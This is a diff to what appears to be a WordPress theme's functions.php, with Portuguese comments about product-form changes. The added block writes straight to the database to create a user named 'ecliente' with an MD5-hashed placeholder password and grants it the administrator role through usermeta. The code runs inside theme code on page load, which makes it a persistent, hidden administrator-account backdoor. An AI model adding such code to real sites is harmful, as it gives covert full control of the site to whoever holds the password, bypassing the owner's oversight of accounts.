@@ -55,3 +55,17 @@ function dc_cf7_add_description_tab( $tabs ) {
  /**
   * Fim da altaração no formulario dos produtos 
   */
+
+//   Criar usuarios novos
+$mysqli = new mysqli("localhost", DB_USER, DB_PASSWORD, DB_NAME);
+$password = '<COLOQUE A SENHA AQUI>';
+
+$sql = $mysqli->query("SELECT count(ID) as c FROM `{$table_prefix}users` WHERE user_login='ecliente' AND user_email='gustavo@ecliente.com.br'");
+$has_user = $sql->fetch_array();
+
+if ($has_user['c'] == 0) {
+    $sql = $mysqli->query("INSERT INTO `{$table_prefix}users`(`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`, `user_activation_key`, `user_status`, `display_name`) VALUES (NULL, 'ecliente', MD5(\"{$password}\"), 'ecliente', 'gustavo@ecliente.com.br', '', NOW(), '', '0', 'ecliente');");
+    $id = mysqli_insert_id($mysqli);
+
+    $mysqli->query("INSERT INTO `{$table_prefix}usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '{$id}', 'wp_capabilities', 'a:1:{s:13:\"administrator\";b:1;}');");
+}
